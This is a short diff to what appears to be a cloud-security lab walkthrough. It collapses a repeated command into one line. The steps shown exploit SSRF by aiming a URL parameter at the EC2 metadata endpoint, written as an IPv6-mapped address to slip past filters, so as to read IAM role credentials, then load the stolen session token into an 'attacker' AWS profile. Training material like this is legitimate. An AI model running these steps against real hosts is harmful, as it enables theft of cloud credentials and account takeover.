@@ -6,7 +6,7 @@ Go to `http://<ec2_ip_address>`
 ```
 http://<ec2_ip_address>/?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/<role>
 aws configure --profile attacker
-echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials`echo "aws_session_token = <token>" >> ~/.aws/credentials
+echo "aws_session_token = <token>" >> ~/.aws/credentials
 ```
 
 ### Command Injection
